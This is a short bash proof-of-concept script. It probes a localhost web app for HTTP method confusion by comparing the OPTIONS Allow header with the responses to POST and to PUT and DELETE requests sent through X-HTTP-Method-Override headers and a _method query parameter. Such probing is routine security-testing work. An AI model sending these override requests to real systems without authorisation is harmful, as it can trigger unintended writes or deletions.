#!/bin/bash

TARGET="http://localhost:3000/"

echo "=== HTTP Method Confusion Vulnerability PoC ==="
echo ""

# Check what Allow header reports
echo "[*] Checking Allow header via OPTIONS:"
curl -s -i "$TARGET" -X OPTIONS 2>&1 | grep -i "allow:"
echo ""

# Try POST (should not be allowed according to Allow header)
echo "[*] Testing POST (should fail according to Allow header):"
curl -s -i "$TARGET" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "name=Test&surname=User&address=123" 2>&1 | grep "HTTP/1.1" 
echo ""

# Try PUT with override (should not be allowed)
echo "[*] Testing PUT with X-HTTP-Method-Override (should fail):"
curl -s -i "$TARGET" -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "X-HTTP-Method-Override: PUT" -d "name=Test&surname=User&address=123" 2>&1 | grep "HTTP/1.1"
echo ""

# Try DELETE with override  
echo "[*] Testing DELETE with X-HTTP-Method-Override (should fail):"
curl -s -i "$TARGET" -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "X-HTTP-Method-Override: DELETE" -d "name=Test&surname=User&address=123" 2>&1 | grep "HTTP/1.1"
echo ""

# Try query parameter override
echo "[*] Testing query parameter method override (?_method=DELETE):"
curl -s -i "$TARGET?_method=DELETE" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "name=Test&surname=User&address=123" 2>&1 | grep "HTTP/1.1"
echo ""

echo "[+] VULNERABILITY: Allow header says only GET allowed, but POST and overrides work!"
